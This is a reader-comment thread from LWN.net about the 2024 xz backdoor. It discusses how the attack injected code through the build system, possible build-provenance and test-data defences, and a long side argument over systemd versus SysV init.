[https://hachyderm.io/@joeyh/112180715824680521](https://hachyderm.io/%40joeyh/112180715824680521)

### A backdoor in xz

Posted Mar 30, 2024 0:32 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967297/)]

A Gist containing a FAQ about the issue:

[https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee...](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)

### A backdoor in xz

Posted Mar 30, 2024 1:01 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967302/)] (43 responses)

It's amazing (and miraculous) how quickly this was found. If the performance impact wasn't as bad, how long would it have flown under the radar?

Yet more reason to de-bloat instead of en-bloat with crap like systemd. xz-utils shouldn't have any relation to sshd, doesn't have any relation to upstream openssh, shouldn't be necessary to tell a service manager "hey I'm running!", telling a service manager "hey I'm running" shouldn't be necessary...

Just because you can do something doesn't mean you should and this is a perfect example of that.

### A backdoor in xz

Posted Mar 30, 2024 1:44 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967313/)] (9 responses)

> Yet more reason to de-bloat instead of en-bloat with crap like systemd.

xz is also pulled in by selinux, or some PAM modules (which SSH also uses).

Arguably, both need to go, and SSH needs to be rewritten in a safe language, with authentication handled by something like systemd instead of random dlopen()-ed modules.

### A backdoor in xz

Posted Mar 30, 2024 8:18 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967363/)] (8 responses)

Gross, selinux; pretty sure UsePAM is also a patch (and it can at least be disabled in the config). The question though is not "what pulls it in" but rather "what pulls it in without adding value" because that's how you get lists of 100s of deps, any one of which is vulnerable to an attack like this.

### A backdoor in xz

Posted Mar 30, 2024 10:54 UTC (Sat)
by **khim** (subscriber, #9252)
[[Link](/Articles/967390/)] (1 responses)

> The question though is not "what pulls it in" but rather "what pulls it in without adding value"

Each patch add value **to someone**, or it wouldn't have existed. Sshd without PAM would be 100% useless to me because all machined that I use ssh with use authentication not supported by stock Debian.

Similarly someone who needs to pass certain certification needs selinux and so on.

That's the flip side of the story which made available open source in the first place: we have millions of users and even if 0.01% of them are developers it's enough to produce software for free.

Remove all that “crap” and suddenly there are not enough developers to drive that thing forward because there are not enough users.

There are no easy solution for that problem, unfortunately.

### A backdoor in xz

Posted Mar 31, 2024 1:27 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967591/)]

There's a difference between adding value to 1 person and adding value to everyone who uses some software, for example.

### A backdoor in xz

Posted Mar 30, 2024 19:32 UTC (Sat)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967513/)] (5 responses)

PAM still has value, it's still very useful for auditing and custom authentication in special environments.

These days, PAM can be mostly replaced by ephemeral SSH certificates for authentication. But it's still useful for auditing.

### A backdoor in xz

Posted Mar 30, 2024 21:25 UTC (Sat)
by **apoelstra** (subscriber, #75205)
[[Link](/Articles/967545/)] (3 responses)

I use pam\_u2f extensively on my personal computers to use a Yubikey to authenticate my login and screenlocker. This usecase can't be replaced by ephemeral SSH certs because the goal is to talk to a physical U2F key which only speaks U2F.

### A backdoor in xz

Posted Mar 31, 2024 0:47 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967581/)] (2 responses)

Is it for interactive logins or for SSH? It's definitely still needed for interactive logins, but they are also much less troublesome. But I don't think SSH needs them.

### A backdoor in xz

Posted Mar 31, 2024 16:54 UTC (Sun)
by **apoelstra** (subscriber, #75205)
[[Link](/Articles/967699/)] (1 responses)

Ah, yes, only for interactive logins. For SSH I use GnuPG's ssh-agent emulation support, whose mechanism I don't really understand.

### A backdoor in xz

Posted Mar 31, 2024 18:51 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967700/)]

ssh-agent (or its emulation) is basically just the public key authentication.

PAM was useful for custom authentication, such as LDAP-based auth or something similar. These days a fairly typical workflow is to use some kind of a daemon/utility on the developer's machine to get a temporary SSH certificate, and then just use this certificate to log in using the SSH.

### A backdoor in xz

Posted Mar 31, 2024 1:27 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967592/)]

Leftpad still has value, it's very useful for padding the left side of a string when you're too lazy to write 2 lines of code.

### A backdoor in xz

Posted Mar 30, 2024 2:22 UTC (Sat)
by **dvdeug** (subscriber, #10998)
[[Link](/Articles/967315/)] (9 responses)

So, do you run the kernel that compressed is 140MB of source (and 100MB of binary)? That's more than Linus's hard drive could hold when he started the project, and 140 times as large as version 1.0. Are you trying to debloat, or are you trying to score points on systemd?

### A backdoor in xz

Posted Mar 30, 2024 8:16 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967362/)] (5 responses)

I have 35MB used in /boot, which includes 3 kernels among other things.

### A backdoor in xz

Posted Mar 30, 2024 8:24 UTC (Sat)
by **niner** (subscriber, #26151)
[[Link](/Articles/967366/)] (3 responses)

What about kernel modules? They are usually not in /boot.

### A backdoor in xz

Posted Mar 30, 2024 21:49 UTC (Sat)
by **dmoulding** (subscriber, #95171)
[[Link](/Articles/967548/)]

As just a random data point, my kernel has all functionality I need built-in to it. I don't even enable loadable module support. The compressed bzImage in /boot is 12M. The uncompressed vmlinux is 41. This is for a desktop with everything that entails (DRM, nouveau, bluetooth, USB, camera/video, audio, etc.)

### A backdoor in xz

Posted Mar 31, 2024 1:29 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967593/)] (1 responses)

/lib/modules $ du -hs `uname -r`

64M 6.6.13-gentoo

I'm not sure if you're aware of `make menuconfig`, but unlike systemd, you actually CAN effectively turn off parts of the kernel that you don't need.

### A backdoor in xz

Posted Mar 31, 2024 1:31 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967594/)]

Oh and here's the actual modules BTW:

700K 6.6.13-gentoo/misc/vboxdrv.ko

48K 6.6.13-gentoo/misc/vboxnetflt.ko

20K 6.6.13-gentoo/misc/vboxnetadp.ko

59M 6.6.13-gentoo/video/nvidia.ko

8.0K 6.6.13-gentoo/video/nvidia-peermem.ko

1.7M 6.6.13-gentoo/video/nvidia-modeset.ko

16K 6.6.13-gentoo/video/nvidia-drm.ko

2.5M 6.6.13-gentoo/video/nvidia-uvm.ko

### A backdoor in xz

Posted Mar 30, 2024 15:10 UTC (Sat)
by **dvdeug** (subscriber, #10998)
[[Link](/Articles/967462/)]

To carry on with niner's point, /boot/vmlinuz-6.7.9-amd64 may be nine megabytes, but /lib/modules/6.7.9-amd64/ is over a hundred. You could read through the kernels of Unix v6 (the Lions book), or xv6, or Minix. Even twenty years ago, the kernel was so big that the SCO mess turned up a copy of Unix malloc buried in kernel that no one had noticed, even though it should have been replaced with standard kernel functions. Should we use a tighter (less functional) kernel that's actually readable? I don't want to give up a lot of the features I use, but there's certainly no one with the headroom to completely understand 140 MB of source code.

### A backdoor in xz

Posted Mar 30, 2024 13:24 UTC (Sat)
by **pawel44** (guest, #162008)
[[Link](/Articles/967378/)] (2 responses)

Kernel is not pulling third party dependencies.

### A backdoor in xz

Posted Mar 30, 2024 14:38 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967442/)] (1 responses)

Well, not when building it. Running it is another matter, as it pulls in a heap of pre-built binaries (firmware) with poorly-documented provenance.

### A backdoor in xz

Posted Mar 30, 2024 15:05 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967454/)]

Running it is another matter, as it pulls in a heap of pre-built binaries (firmware) with poorly-documented provenance.

Even worse: it does not even \_log\_ what it loaded! I usually carry this hack:
```

--- a/drivers/base/firmware_loader/main.c
+++ b/drivers/base/firmware_loader/main.c
@@ -562,7 +562,7 @@ fw_get_filesystem_firmware(struct device *device, struct fw_priv *fw_priv,
                size = rc;
                rc = 0;

-               dev_dbg(device, "Loading firmware from %s\n", path);
+               dev_warn(device, "XXXX Loading firmware from %s\n", path);
                if (decompress) {
                        dev_dbg(device, "f/w decompressing %s\n",
                                fw_priv->fw_name);
@@ -924,6 +924,10 @@ _request_firmware(const struct firmware **firmware_p, const char *name,
                fw_log_firmware_info(fw, name, device);
        }

+       dev_warn(device, "XXXX request-firmware name=%s, ret=%d\n",   name, ret);

        *firmware_p = fw;
        return ret;
 }

```

### A backdoor in xz

Posted Mar 30, 2024 2:56 UTC (Sat)
by **himi** (subscriber, #340)
[[Link](/Articles/967316/)] (22 responses)

> Yet more reason to de-bloat instead of en-bloat with crap like systemd. xz-utils shouldn't have any relation to sshd, doesn't have any relation to upstream openssh, shouldn't be necessary to tell a service manager "hey I'm running!", telling a service manager "hey I'm running" shouldn't be necessary...

Services telling the service manager "hey, I'm running!" makes it much /much/ easier to have robust systems. I've run into all sorts of problems getting multiple dependent services working together reliably because of timing issues during startup - an early service happens to take a second longer to come up than expected, a dependent service comes up at just the right time that it doesn't get a connection refused and instead has to wait for a timeout, and anything that happens afterwards is just broken (without manual intervention). Having that first service /explicitly/ tell the service manager "I'm ready to accept connections" avoids that kind of thing /reliably/, without needing to throw in random sleeps that avoid 99.9% of the problems but make everything take five times as long as it should, and which still don't address that 0.1% tail.

Sure, I could implement that coordination in the services . . . at least for the ones I've written. Otherwise I'd need to what, wrap dependent services in something that /does/ handle the coordination? And what about cleanly shutting down or restarting - obviously I'd need the wrapper to handle that, too. And I'd need to wrap /everything/ somehow so that starting and stopping the whole stack in the correct order would work, and handle errors in the startup process sensibly, and and and . . .

And guess what - handling dependencies between services sensibly is pretty much the bare minimum for any reasonable service manager. Supporting that in some kind of "lets avoid systemd at all costs", "I'm not a service manager, just a thin coordination wrapper, no, really" bit of code is at best fiddly and difficult to do well, and at worst ends up being a reimplementation of a significant chunk of systemd. And even if you do all that, on a \*nix system you'll ultimately end up having to delegate at least /some/ things to pid 1, particularly if you want a robust and reliable system (even if it's just tidying up zombie processes).

There's a minimum level of core complexity in any functional system - for a system based on a modern Linux kernel and the current standard Linux userspace, that minimum level of core complexity is close enough to what systemd provides that desperately trying to avoid all of systemd's "bloat" just means you're making things both less functional /and/ less robust. You /can/ make that kind of trade-off work (Alpine does a decent job of it, since they're targeting fairly constrained use cases), but pretending that there's no trade-off happening is just delusional.

But it's also irrelevant in this case, because lots of things other than systemd pull in liblzma - including pam, which was a critical component of a functional sshd on Linux /long/ before systemd became the default. The minimum level of core complexity back when we were all relying on SysV init was still plenty broad enough for a sufficiently motivated and well resourced attacker to find exploitable weaknesses, and there were far fewer options available to harden systems against that kind of attack.

### A backdoor in xz

Posted Mar 30, 2024 8:19 UTC (Sat)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967364/)] (11 responses)

Til they tell the service manager "I'm running!" just before failing. I've had that happen several times, in fact. The only \*actual\* solution for that problem is monitoring. Notify-by-socket is precisely equivalent to notify-by-fork in terms of reliability.

### A backdoor in xz

Posted Mar 30, 2024 9:57 UTC (Sat)
by **cesarb** (subscriber, #6266)
[[Link](/Articles/967379/)] (4 responses)

Another solution is the watchdog: the service has to tell the service manager "I'm still running!" periodically, otherwise it's treated as failed. Then the main effect of the initial "I'm running!" is that the timeout before it is given by TimeoutStartSec, and the timeout after it is given by WatchdogSec, which can be shorter (allowing for services which are slow to start, like heavy Java-based servers).

### A backdoor in xz

Posted Mar 31, 2024 1:33 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967596/)] (3 responses)

Til it tells the service manager "I'm still running" but never calls accept again. Notify-by-socket is precisely equivalent to notify-by-fork in terms of reliability.

The solution you are looking for is \*monitoring\*.

### A backdoor in xz

Posted Mar 31, 2024 1:45 UTC (Sun)
by **intelfx** (subscriber, #130118)
[[Link](/Articles/967600/)] (2 responses)

> Notify-by-socket is precisely equivalent to notify-by-fork in terms of reliability.

It might be "equivalent" in an information-theoretical sense (everything that can be achieved with one, is also achievable with the other), but it's absolutely not equivalent in \_practical reliability\_.

Setting up a proper "notifying" double-fork (which, I remind you, means that the immediate child has to wait for the grandchild to initialize and only then exit, because in most cases the initialization must be completed in the grandchild) is tenfold more \_complicated\_ and \_easier to get wrong\_ than simply writing a line into a pre-existing socket that the supervisor has prepared for you.

Even more: all known cases of proper notifying double-fork implementatoin involve creating a temporary pipe or socket between the child and the grandchild, precisely for the reasons described above. As such, we are choosing between a notify-by-socket implemented \_once\_ and a notify-by-socket implemented \_over and over again\_ in each daemon. The choice must be obvious, unless you specifically have an irrational axe to grind against systemd.

### A backdoor in xz

Posted Mar 31, 2024 6:22 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967634/)] (1 responses)

> As such, we are choosing between a notify-by-socket implemented \_once\_ and a notify-by-socket implemented \_over and over again\_ in each daemon. The choice must be obvious,

Indeed it must be, considering that we are discussing the result of everyone sharing a single implementation of it.

### A backdoor in xz

Posted Mar 31, 2024 12:25 UTC (Sun)
by **bluca** (subscriber, #118303)
[[Link](/Articles/967664/)]

No, most of us are discussing the result of a multi-year-long sophisticated social engineering attack that preyed on underfunded and overworked unpaid maintainers to inject a complex backdoor. Yes, a handful of people are missing the wood for the trees because they are unable or unwilling to run a simple command to check the attack surface gained by backdooring xz:

$ apt-cache rdepends liblzma5 | wc -l

354

If it hadn't been libsystemd in the middle of the dependency chain, it would have been something else. The exploit was primed and ready to add more backdoors for other arbitrary workflows, with pre-prepared and unused "test files" signatures that we'll now never know what would have attacked.

### A backdoor in xz

Posted Mar 30, 2024 14:29 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967430/)] (2 responses)

One does not exclude the other. In fact many of my monitoring scripts actively check that the service in question hasn't legitimately been shut down before complaining (too) loudly.

You cannot do a "has legitimately been shut down" check without systemd. (Well, OK, of course I could use or write some other code that does this job, but why would I want to replace one mostly-coherent, widely-used presumed-safe software package with five less-widely-used and poorly-integrated ones? sysV init scripts are of no help here)

### A backdoor in xz

Posted Mar 31, 2024 1:33 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967597/)] (1 responses)

Yes you can? OpenRC has done it for longer than systemd has existed ffs

### A backdoor in xz

Posted Apr 1, 2024 14:06 UTC (Mon)
by **farnz** (subscriber, #17727)
[[Link](/Articles/967805/)]

I used OpenRC before I used systemd; it does not, as far as I can find (and even today) offer a proper lifecycle check; in particular, the only queries you can ask it are "is this service running", "is this service known and shut down", or "has this service crashed", whereas systemd adds "is this service running but in the process of shutting down" and "is this service running but in the process of restarting" to that list, which is essential for automated remediation of faults - you know that if a service is restarting, a fault is OK, while if a service is shutting down, you should determine if that shutdown is expected, or if you need to alert a human.

### A backdoor in xz

Posted Mar 30, 2024 14:48 UTC (Sat)
by **dvdeug** (subscriber, #10998)
[[Link](/Articles/967446/)] (2 responses)

> Til they tell the service manager "I'm running!" just before failing.

Which is a bug; they should complete all checks that make them fail before reporting success. Yes, bugs are a reality.

> The only \*actual\* solution for that problem is monitoring. Notify-by-socket is precisely equivalent to notify-by-fork in terms of reliability.

No, there exists many cases where a fork happens and then the program fails before it would have notified the service manager it was successfully running. By the same logic, monitoring is precisely equivalent to notify-by-fork in terms of reliability; monitoring programs can fail to notice a service no longer working as well, except that they add false positives and can report that a system has failed when it's been properly shutdown or had a temporary glitch, as from system overload.

### A backdoor in xz

Posted Mar 31, 2024 1:34 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967598/)] (1 responses)

> Which is a bug; they should complete all checks that make them fail before reporting success. Yes, bugs are a reality.

Indeed. But \*IT IS THE SAME BUG WHETHER YOU'RE USING SYSTEMD'S NOTIFICATIONS OR FORKING\*

I don't understand why I have to explain that so many times only to hear the EXACT SAME (inane) ARGUMENT again.

### A backdoor in xz

Posted Apr 1, 2024 11:29 UTC (Mon)
by **HenrikH** (subscriber, #31152)
[[Link](/Articles/967784/)]

for that particular deamon yes, but there are less that have this bug than where the double fork is not reliable (which is 100% of the double fork cases).

### A backdoor in xz

Posted Mar 30, 2024 23:34 UTC (Sat)
by **mchehab** (subscriber, #41156)
[[Link](/Articles/967558/)] (9 responses)

> Services telling the service manager "hey, I'm running!" makes it much /much/ easier to have robust systems.

System V init systems are typically a lot more robust than systemd ones, as:

- the order where servers start is fixed; no risk of starting a process too early;

- jobs are started in sequence. Things like Network were started before network daemons like sshd, apache, etc;

- no parallel jobs during init/shutdown time;

- critical jobs that should never be stopped could also be added to the /etc/inittab. They were respawned if something bad happens and the process ends dying.

Also, the "hey, I'm running" task is really simple: if a process has problems, it shall die. PID 1 shall detect it and take the appropriate action when this happens. Modifying the daemon's source, specially with OOT patches sounds a very bad idea.

So, while systemd offers lots of flexibility, in terms of system's robustness, simpler usually means more stable and more reliable. I'm yet to see a systemd-based system more reliable than a SysV one. At best, it might be equivalent in terms of robustness.

### A backdoor in xz

Posted Mar 31, 2024 1:14 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967585/)] (3 responses)

> - jobs are started in sequence. Things like Network were started before network daemons like sshd, apache, etc;

What about wireless or VPNs?

> Also, the "hey, I'm running" task is really simple: if a process has problems, it shall die.

A Java server that I have for telephony takes 2 minutes to start up. How would you detect that?

There's also a problem with double-forking. The only process that can detect the death of a double-forked server is PID 1, and in classic SysV all it did was to reap the PID. Ditto for inittab - it can't detect the death of double-forked processes.

### A backdoor in xz

Posted Mar 31, 2024 1:38 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967599/)] (2 responses)

> What about wireless or VPNs?

What about it? Both work fine for me, I have 3 VPNs and occasionally wireless (tethering via my phone).

> A Java server that I have for telephony takes 2 minutes to start up. How would you detect that?

Well, for one thing, I wouldn't use Java, and I wouldn't use a server that takes 2 minutes to start up. Other than that, there are plenty of solutions for this that you could easily implement in sysvinit (you can run whatever you want whenever you want, after all, it's just a shell script); OpenRC actually handles it natively (and has since before systemd existed).

> The only process that can detect the death of a double-forked server is PID 1

That's not true (PR\_SET\_CHILD\_SUBREAPER).

> in classic SysV all it did was to reap the PID

How is that an argument for systemd?

> Ditto for inittab - it can't detect the death of double-forked processes

Huh? inittab is a config file.

### A backdoor in xz

Posted Mar 31, 2024 3:51 UTC (Sun)
by **Cyberax** (**✭ supporter ✭**, #52523)
[[Link](/Articles/967615/)] (1 responses)

> What about it? Both work fine for me, I have 3 VPNs and occasionally wireless (tethering via my phone).

Now try to make sure that the daemon does not come up until at least one network interface is up. Or until the VPN connection is established.

> That's not true (PR\_SET\_CHILD\_SUBREAPER).

That's true in classic SysV. The subreaper was introduced only in Linux 3.4

> Huh? inittab is a config file.

If you're talking about SysV "simplicity", then you should at least learn it. Classic inittab supports respawning processes on death (action=respawn).

### A backdoor in xz

Posted Mar 31, 2024 6:18 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967632/)]

> Now try to make sure that the daemon does not come up until at least one network interface is up. Or until the VPN connection is established.

Done and done.

> That's true in classic SysV. The subreaper was introduced only in Linux 3.4

... okay?

> If you're talking about SysV "simplicity", then you should at least learn it. Classic inittab supports respawning processes on death (action=respawn).

I know it, thanks. That's not a separate program. That's part of init. Controlled by the configuration file, inittab. If you're going to act like you know something better than someone else, then you should at least learn it.

### A backdoor in xz

Posted Mar 31, 2024 1:58 UTC (Sun)
by **himi** (subscriber, #340)
[[Link](/Articles/967584/)] (4 responses)

If SysV init systems are actually more robust than systemd ones, it's because they're much simpler - your description captures that simplicity really neatly, in fact.

Though I don't actually believe that claim - I've had plenty of SysV init based systems that were massive pains in the neck to deal with, while the majority of the systemd based systems I've managed have been fairly benign and well behaved, despite doing a whole lot more. Also, the issues I have to deal with generally have nothing to do with systemd, and when they /are/ issues with the unit configuration they've been much easier to resolve than similar issues with init scripts ever were.

Oh, and writing a service targeting a SysV init environment is /far/ more of a pain than writing the same thing targeting a systemd environment - in fact, it's ridiculous how easy it is to target systemd with a basic service. No daemonising, no futzing around with logging targets, no pid files, even the kind of basic intra-service coordination you're pooh-poohing is ridiculously simple. And no mess of spaghetti shell code init script! Most of the time the unit file for a basic service is five or ten lines, and they're simple and declarative with no complex logic - infinitely easier to write and debug. Even when you need to set up complex interdependencies it's generally simple to configure and relatively easy to debug - it can be fiddly, but that's mostly inherent to the problem, rather than an artefact of systemd's implementation.

SysV init worked okay in its day, though it was always a bit of a pain. But it's long /long/ past the time when people should have recognised how much of an improvement systemd is, in pretty much every way. Eulogising the past is all well and good, but actual current performance matters a whole lot more in the real world than sepia-tinted memories of past glories.

### Here too

Posted Mar 31, 2024 2:05 UTC (Sun)
by **corbet** (editor, #1)
[[Link](/Articles/967603/)]

Fighting the old systemd wars yet again is not going to help us address this kind of attack. Please, let's not do that.

### A backdoor in xz

Posted Mar 31, 2024 3:13 UTC (Sun)
by **DimeCadmium** (subscriber, #157243)
[[Link](/Articles/967611/)] (2 responses)

Indeed, simpler is better. Simpler is easier to secure, simpler is easier to develop, simpler is easier to maintain (i.e. run a system with it), simpler is easier to modify, simpler is easier to troubleshoot, simpler is easier to understand.

### A backdoor in xz

Posted Mar 31, 2024 13:00 UTC (Sun)
by **pizza** (subscriber, #46)
[[Link](/Articles/967667/)]

> Indeed, simpler is better.

You can have your remberberries, but the rest of us have to deal with the real world.

...The real world isn't simple, hasn't ever been, and has only trended towards higher complexity.

### A backdoor in xz

Posted Apr 1, 2024 14:08 UTC (Mon)
by **farnz** (subscriber, #17727)
[[Link](/Articles/967810/)]

FWIW, by porting a system from SysV init to systemd, I was able to close several hard-to-reproduce bugs, since systemd's extra complexity allowed me to remove a ton of complexity from the various scripts that started components of the system, and at least some of that complexity turned out to have race conditions in it that systemd did not have.

There is a huge advantage to one implementation of something done well replacing (in my case) 5 different implementations, all with different bugs.

### A backdoor in xz

Posted Mar 30, 2024 2:10 UTC (Sat)
by **helsleym** (guest, #92730)
[[Link](/Articles/967317/)] (11 responses)

Seems like release builds, at least, ought to be isolated from binary blobs whenever possible. The build system of nearly any project could probably delete \*all\* test infrastructure (including testcase data), documentation directories (could contain binary "images"), etc. before starting the (release) build. Committing binary data to source respositories should also be seen as deeply taboo. Plenty of projects have been pretty lax about that or even chided others for being wary of binary blobs. The fact is: it's not "source" after all and it makes finding this kind of stuff even less likely.

### A backdoor in xz

Posted Mar 30, 2024 4:01 UTC (Sat)
by **himi** (subscriber, #340)
[[Link](/Articles/967323/)] (10 responses)

The difficulty with doing that is the fact that you /want/ to be able to run the test suite as a standard part of the package build process, because you want to be able to say with confidence that the code you're wrapping up in that package works as intended when built as part of your distribution. And you /really/ want to be able to run the test suite using exactly the same source distribution that you're building your packages from, in the same system context the packages will be installed into, because otherwise you (and your users) have no guarantees about the validity of those tests. A properly done test suite will include test cases that exercise any security-critical code paths, if you're not testing the same code with the same set of libraries and environment as you expect them to be used in, then those security-critical code paths may not be tested meaningfully.

I'm not sure how practical it would be to completely avoid having binary blobs of test data in the repository, particularly for something like a compression library - the only real alternative would be to have code that could /generate/ the test data from some kind of human-readable format. I'm sure it would be /possible/ - most test cases would require well-formed or very selectively malformed examples of a well-defined set of binary data structures, which you'd specify in your human-readable format and then "compile" to the actual binary test data mechanically. How practical that would actually be I don't know . . . but I'm almost certain that the effort required to change existing test suites built around binary blobs over to using generated data would be prohibitive, particularly for projects like xz, which appears to have been vulnerable to this attack precisely because of the lack of developer capacity.

Sanitising the build environment somehow while keeping the full original source distribution available would probably be a saner option - maybe do the build in a sanitised context, snapshot the results, and then re-extract the source along with anything required for testing? But then you run into the question of how to sanitise the build environment, which would probably be a giant pain, and decidedly distribution-specific . . . Perhaps you could throw compute resources at the problem and just run builds with more and more files deleted until it failed to produce an identical binary, at which point you have your baseline for that particular package? CPU time on build farms is free, isn't it?

Longer term the developer community probably needs to come up with a set of best practice guidelines about how to mitigate these kinds of issues, and tooling to make those best practices nice and easy to implement; then all we'll need to do is find the developer capacity to move existing codebases over to those best practices . . .

### A backdoor in xz

Posted Mar 30, 2024 14:35 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967438/)] (9 responses)

> I'm not sure how practical it would be to completely avoid having binary blobs of test data in the repository

Nobody requested that. The problem here is a binary blob that (a) is executed as part of the test (b) isn't even checked in (c) is able to modify the built artefacts.

All three of those are red flags. Preventing any one of them would have disabled this attack. In fact, checking out the git repo (with its immutable commit ID and all that) instead of downloading a tarball which is only loosely (too loosely as it turns out) associated with the release in question could, and should really, have prevented this from affecting Debian (and probably others).

### A backdoor in xz

Posted Mar 30, 2024 20:10 UTC (Sat)
by **mjg59** (subscriber, #23239)
[[Link](/Articles/967537/)] (1 responses)

This is inaccurate. The backdoor code is checked in, and isn't able to modify the artifacts in itself. What isn't checked in is a backdoored m4 macro that injects code into configure, which in turn extracts further code from the test files and injects those into the build. It's kind of expected that configure is able to influence the build process, and compressor test files are inherently going to be binaries, so really the only red flag was the difference between the git repo and the tarball - a difference that's largely expected, given how autotools works.

### A backdoor in xz

Posted Mar 30, 2024 23:56 UTC (Sat)
by **chrisoofar** (guest, #170494)
[[Link](/Articles/967568/)]

There is a lot of valid conversation around the viability of the autoconf build stack that should not be discounted, and it's time to put it to bed just like programmers left JCL job cards.

And if we're going to insist on a build tool with its own scripting language, then for the love of God and all that is holy pick or construct something that enforces readability with an iron fist.

### A backdoor in xz

Posted Mar 31, 2024 1:00 UTC (Sun)
by **himi** (subscriber, #340)
[[Link](/Articles/967559/)] (6 responses)

We want to avoid binary blobs in the source repository because we want the entire repository to be human readable, and therefore at least notionally subject to human review - it's not ridiculous to consider the practicality of the idea. Particularly for cases like this where it's a binary file format which obviously needs binary data as input for at least some of its test cases. It's definitely /possible/, and it may be desirable in the abstract, but how practical it'd be, how much value it'd add, and whether it'd be worth the disruption are the questions that need answering. Certainly it would mitigate against this particular attack, and raises the bar for any attack that wanted to hide a payload in plain sight, but it'd need careful consideration before being recommended as a matter of course.

There are two reasonably simple mitigations that /could/ be done (and probably should be done) to mitigate against this kind of attack: building from reproducible and traceable source (i.e. a git checkout or a git archive with enough metadata that the contents can be verified against a trusted git repo); and doing the actual build in a sanitised environment with no access to anything not required for the build. The obvious people to implement these mitigations are the distros, but they should probably be standard practise for anyone who's creating binary distributables.

'git archive' already does most of what we'd want, but it'd need to add metadata to make the archive contents more readily verifiable, and probably a bunch of smaller tweaks to make it reliable and reproducible for this use case; it probably also needs a properly standardised output format, to avoid issues like we saw with github's changing "release archives". Git would also need to complete the move away from vulnerable digest algorithms, though in practise the "vulnerable" digests are probably still a sufficiently high barrier against almost all attackers. Using a repo checkout directly /isn't/ a good idea - unless you set it up carefully you'd be exposing everything in the repo to your build; this would also make any hash collision attack against the digest algorithm far more valuable to an attacker. An archive mostly avoids those issues, as well as being more easily redistributable.

A sanitised package build environment is something that would mostly be implemented by the distros rather than the developers. It /should/ be pretty simple to implement, even if you want to be able to run the test suite using the newly built binaries: make an initial copy of the source tree, sanitise it, do the build, then retrieve the build artefacts; make another clean copy of the source tree, drop the build artefacts back in, then run the test suite; assuming it passes, package up the build artefacts and you're done. Again, it mitigates against a replay of this attack, and raises the bar a /lot/ for future attacks that want to use the build system to inject an obfuscated payload that's been added to the source distribution, but it does so in a way that can be applied to just about all package builds without needing to change the entire world.

The biggest challenge is how to sanitise the build environment - the best approach would have the developers change the organisation of the source tree to make it easier to sanitise; without that, it'd be a long hard slog to examine each and every package to determine the bare minimum that was required for a reproducible build. I imagine a lot of the grunt work could be automated, but the results would still need to be validated by a human, and re-validated each time the source tree changed.

More broadly, though, we need to adjust our threat models to include potentially malicious maintainers. The two mitigations I've discussed here could address some of that - visibility and verifiability of source distribution, and reducing the attack surface presented by the build environment. There's going to be lots of other threats that come to light as we come to grips with this new threat model, though - we need to be careful not to focus too closely on the details of this particular attack.

### A backdoor in xz

Posted Mar 31, 2024 14:06 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967684/)] (5 responses)

> We want to avoid binary blobs in the source repository because we want the entire repository to be human readable, and therefore at least notionally subject to human review - it's not ridiculous to consider the practicality of the idea. Particularly for cases like this where it's a binary file format which obviously needs binary data as input for at least some of its test cases. It's definitely /possible/, and it may be desirable in the abstract, but how practical it'd be, how much value it'd add, and whether it'd be worth the disruption are the questions that need answering. Certainly it would mitigate against this particular attack, and raises the bar for any attack that wanted to hide a payload in plain sight, but it'd need careful consideration before being recommended as a matter of course.

I'd say that in the specific case of xz, it should be generating corrupted test files etc using \*xz itself\*, and then buggering them using existing tooling. If it had done that routinely it would be obvious that a giant binary lump claiming to be a corrupted xz file was up to no good.

The hard part is testing \*non\*-corrupted files. You can't reliably construct \*those\* with the built xz, because if the built xz is buggy it's going to generate a messed-up file rather than the non-corrupted file that is desired (and you presumably want to detect cases where the compressor and decompressor are buggered-up in the same way). Not sure how to fix that: you can't use the xz already on the system because it might be similarly buggered-up...

### A backdoor in xz

Posted Mar 31, 2024 19:05 UTC (Sun)
by **cesarb** (subscriber, #6266)
[[Link](/Articles/967721/)] (4 responses)

In my opinion, it's the opposite: non-corrupted files could be described using a custom human-readable assembly-like language which represents the primitives allowed in the compression format (something like "LITERAL 03 AA BB CC TREE ..."), while corrupted files could be crazy files found by users which happened to cause older versions of the software to misbehave, and which were added as a regression test.

> You can't reliably construct \*those\* with the built xz, because if the built xz is buggy it's going to generate a messed-up file [...] and you presumably want to detect cases where the compressor and decompressor are buggered-up in the same way

That is easy to avoid, you just need to add an "expected hash" to check that the compressor generated the correct data for the decompressor to test. But that doesn't help when you want to test that the decompressor remains compatible with data generated by \*older\* versions of the compressor (which the current code no longer generates), or even alternative compressor implementations. There's a lot of flexibility in compressor output, so it's not unusual for it to change.

### A backdoor in xz

Posted Mar 31, 2024 19:41 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967730/)]

Yeah, solving this is hard.

